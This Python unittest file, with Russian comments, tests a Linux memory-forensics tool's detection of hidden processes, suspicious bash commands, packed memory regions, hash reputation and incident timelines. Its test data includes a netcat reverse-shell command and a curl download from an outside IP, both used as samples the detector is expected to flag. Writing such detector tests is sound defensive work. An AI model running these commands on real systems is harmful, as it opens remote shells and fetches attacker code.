# -*- coding: utf-8 -*-
"""Модульные тесты LMA 2.1 (стандартный unittest, внешних зависимостей нет).

Запуск:  python3 -m unittest discover -s tests -v

Покрывают:
  * уточнённый критерий DKOM против наивного (cross_view);
  * контекстное подавление ложных срабатываний bash (cross_view);
  * классификацию областей по энтропии (malfind.classify);
  * регрессию кеша репутации (core.reputation, баг числа bindings SQL);
  * сопоставление контрольных «чистых» двойников по офсетам (metrics);
  * сборку хронологии инцидента (timeline).
"""
from __future__ import annotations

import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import cross_view, malfind, metrics, reputation, timeline, utils


def _proc(pid, tid=None, name="bash", ppid=1, created="2026-11-14T19:55:00+00:00"):
    return {"pid": pid, "tid": tid if tid is not None else pid, "ppid": ppid,
            "name": name, "uid": 0, "offset": 0x1000 + pid, "created": created}


def _task(pid, tid=None, name="bash", exit_state="TASK_RUNNING"):
    return {"pid": pid, "tid": tid if tid is not None else pid, "ppid": 1,
            "name": name, "exit_state": exit_state, "offset": 0x9000 + pid}


class TestCrossView(unittest.TestCase):
    def test_refined_finds_dkom_hidden_process(self):
        pslist = [_proc(1, name="systemd"), _proc(910, name="sshd")]
        psscan = [_task(1, name="systemd"), _task(910, name="sshd"),
                  _task(4242, name="kworker/u8:3")]
        res = cross_view.detect_hidden_processes(pslist, psscan)
        self.assertEqual([h["pid"] for h in res["hidden"]], [4242])

    def test_refined_rejects_threads(self):
        pslist = [_proc(2100)]
        psscan = [_task(2100, tid=2103, name="bash")]
        res = cross_view.detect_hidden_processes(pslist, psscan)
        self.assertEqual(res["hidden"], [])
        self.assertEqual(res["stats"]["rejected_threads"], 1)

    def test_refined_rejects_exited(self):
        pslist = [_proc(1)]
        psscan = [_task(1), _task(999, name="x", exit_state="EXIT_ZOMBIE")]
        res = cross_view.detect_hidden_processes(pslist, psscan)
        self.assertEqual(res["hidden"], [])
        self.assertEqual(res["stats"]["rejected_exited"], 1)

    def test_naive_criterion_gives_false_positive_on_thread(self):
        pslist = [_proc(2100)]
        psscan = [_task(2100), _task(2100, tid=2103, name="bash")]
        naive = cross_view.detect_hidden_naive([p["pid"] for p in pslist],
                                               [p["pid"] for p in psscan])
        self.assertEqual(naive, [])
        psscan.append(_task(4242))
        naive = cross_view.detect_hidden_naive([p["pid"] for p in pslist],
                                               [p["pid"] for p in psscan])
        self.assertEqual(naive, [4242])


class TestBashHeuristics(unittest.TestCase):
    def test_reverse_shell_flagged(self):
        hist = [{"pid": 2100, "process": "bash",
                 "timestamp": "2026-11-14T20:20:00+00:00",
                 "command": "nc -e /bin/sh 185.220.101.5 4444"}]
        res = cross_view.analyze_bash_history(hist, suppress=True)
        self.assertEqual(len(res["iocs"]), 1)
        self.assertEqual(res["iocs"][0]["severity"], "critical")

    def test_trusted_download_suppressed(self):
        hist = [{"pid": 2100, "process": "bash",
                 "timestamp": "2026-11-14T19:58:11+00:00",
                 "command": "wget https://archive.ubuntu.com/ubuntu/pool/v/vim.deb"}]
        res = cross_view.analyze_bash_history(hist, suppress=True)
        self.assertEqual(res["iocs"], [])
        self.assertEqual(len(res["suppressed"]), 1)

    def test_untrusted_download_not_suppressed(self):
        hist = [{"pid": 2100, "process": "bash",
                 "timestamp": "2026-11-14T20:20:00+00:00",
                 "command": "curl http://185.220.101.5/x.sh -o x.sh"}]
        res = cross_view.analyze_bash_history(hist, suppress=True)
        self.assertEqual(len(res["iocs"]), 1)

    def test_chmod_in_build_context_suppressed(self):
        hist = [{"pid": 2100, "process": "bash",
                 "timestamp": "2026-11-14T20:01:44+00:00",
                 "command": "chmod +x ./configure"}]
        res = cross_view.analyze_bash_history(hist, suppress=True)
        self.assertEqual(res["iocs"], [])
        res = cross_view.analyze_bash_history(hist, suppress=False)
        self.assertEqual(len(res["iocs"]), 1)


class TestMalfindClassify(unittest.TestCase):
    def test_packed_region(self):
        profile = {"entropy": 7.99, "printable": 0.1, "size": 1 << 16,
                   "x86_prologue": True, "elf": False}
        res = malfind.classify(profile, "rwx")
        self.assertEqual(res["verdict"], "packed_or_encrypted")
        self.assertTrue(res["scan"])

    def test_text_region_not_scanned(self):
        profile = {"entropy": 5.1, "printable": 0.95, "size": 1 << 16,
                   "x86_prologue": False, "elf": False}
        res = malfind.classify(profile, "rw-")
        self.assertEqual(res["verdict"], "not_executable")
        self.assertFalse(res["scan"])

    def test_zero_padding(self):
        profile = {"entropy": 0.0, "printable": 0.0, "size": 1 << 16,
                   "x86_prologue": False, "elf": False}
        res = malfind.classify(profile, "rwx")
        self.assertEqual(res["verdict"], "zero_padding")

    def test_entropy_bounds(self):
        self.assertGreaterEqual(utils.shannon_entropy(b"aaaa"), 0.0)
        self.assertLessEqual(utils.shannon_entropy(bytes(range(256)) * 4), 8.0 + 1e-9)


class TestReputationCache(unittest.TestCase):
    """Регрессия: в INSERT ... COALESCE было 9 placeholder'ов при 8 параметрах."""

    def test_store_and_reuse(self):
        with tempfile.TemporaryDirectory() as tmp:
            checker = reputation.ReputationChecker(
                os.path.join(tmp, "cache.sqlite3"), provider="local")
            digest = "a" * 64
            checker._store(digest, "malicious", "Lab.Loader.Shellcode", "local_reference_list")
            checker._store(digest, "malicious", "Lab.Loader.Shellcode", "local_reference_list")
            row = checker.db.execute(
                "SELECT verdict, signature, first_seen FROM hashes WHERE sha256=?",
                (digest,)).fetchone()
            self.assertEqual(row[0], "malicious")
            self.assertIsNotNone(row[2])
            cached = checker._cached(digest)
            self.assertIsNotNone(cached)
            self.assertEqual(cached["verdict"], "malicious")

    def test_local_list_lookup(self):
        with tempfile.TemporaryDirectory() as tmp:
            ref = os.path.join(tmp, "ref.txt")
            with open(ref, "w", encoding="utf-8") as fh:
                fh.write("# comment\n")
                fh.write("b" * 64 + " malicious Lab.Packed.UPX\n")
            checker = reputation.ReputationChecker(
                os.path.join(tmp, "cache.sqlite3"), provider="local", local_list=ref)
            res = checker.check("b" * 64)
            self.assertEqual(res["verdict"], "malicious")
            self.assertEqual(res["signature"], "Lab.Packed.UPX")


class TestMetricsBenignControls(unittest.TestCase):
    """Контрольные двойники сопоставляются по диапазону офсетов в образе,
    а не по ключу (правило, pid): у двойника и настоящего секрета он совпадает."""

    def test_offset_matching_no_false_positive(self):
        truth = {
            "yara_findings": [{"rule": "Linux_Secret_Shadow_Hash", "pid": 3100}],
            "benign_lookalikes": [{"rule": "Linux_Secret_Shadow_Hash", "pid": 3100,
                                   "offset": 0x400100, "end": 0x400160}],
        }
        detections = {"hidden_pids": [], "iocs": [], "regions": [],
                      "yara": [{"rule": "Linux_Secret_Shadow_Hash", "pid": 3100,
                                "region": "full_image", "offset": 0x400050}]}
        met = metrics.evaluate(detections, truth)
        self.assertEqual(met["benign_controls"]["flagged"], 0)

    def test_offset_matching_catches_real_hit_inside_range(self):
        truth = {
            "yara_findings": [{"rule": "Linux_Secret_Shadow_Hash", "pid": 3100}],
            "benign_lookalikes": [{"rule": "Linux_Secret_Shadow_Hash", "pid": 3100,
                                   "offset": 0x400100, "end": 0x400160}],
        }
        detections = {"hidden_pids": [], "iocs": [], "regions": [],
                      "yara": [{"rule": "Linux_Secret_Shadow_Hash", "pid": 3100,
                                "region": "full_image", "offset": 0x400110}]}
        met = metrics.evaluate(detections, truth)
        self.assertEqual(met["benign_controls"]["flagged"], 1)

    def test_region_findings_do_not_count_as_benign_hits(self):
        truth = {
            "yara_findings": [],
            "benign_lookalikes": [{"rule": "Linux_Secret_Shadow_Hash", "pid": 3100,
                                   "offset": 0x400100, "end": 0x400160}],
        }
        detections = {"hidden_pids": [], "iocs": [], "regions": [],
                      "yara": [{"rule": "Linux_Secret_Shadow_Hash", "pid": 3100,
                                "region": "vma", "offset": 0x10}]}
        met = metrics.evaluate(detections, truth)
        self.assertEqual(met["benign_controls"]["flagged"], 0)


class TestTimeline(unittest.TestCase):
    def test_chronology_sorted_and_annotated(self):
        processes = [_proc(1, name="systemd"), _proc(4242, name="kworker/u8:3",
                                                     created="2026-11-14T19:56:30+00:00")]
        psscan = [_task(1), _task(4242), _task(666, name="stealth")]
        hidden = cross_view.detect_hidden_processes(processes, psscan)
        hist = [{"pid": 2100, "process": "bash",
                 "timestamp": "2026-11-14T20:20:00+00:00",
                 "command": "nc -e /bin/sh 185.220.101.5 4444"}]
        iocs = cross_view.analyze_bash_history(hist)["iocs"]
        findings = [{"rule": "Linux_Injection_Shellcode_Socket_x64", "severity": "critical",
                     "mitre": "T1059.004", "pid": 4242, "process": "kworker/u8:3",
                     "region": "full_image", "offset": 0x400000}]
        tl = timeline.build_timeline(processes, hist, hidden, iocs, findings, [])
        types = [e["type"] for e in tl["events"]]
        self.assertIn("process_start", types)
        self.assertIn("hidden_process", types)
        self.assertIn("command", types)
        self.assertIn("yara_detection", types)
        stamps = [e["timestamp"] for e in tl["events"] if e.get("timestamp")]
        self.assertEqual(stamps, sorted(stamps))
        hid = next(e for e in tl["events"] if e["type"] == "hidden_process")
        self.assertEqual(hid["severity"], "critical")
        self.assertEqual(tl["stats"]["by_type"]["yara_detection"], 1)

    def test_empty_inputs(self):
        tl = timeline.build_timeline([], [], {"hidden": []}, [], [], [])
        self.assertEqual(tl["events"], [])
        self.assertEqual(tl["stats"]["total"], 0)


if __name__ == "__main__":
    unittest.main()
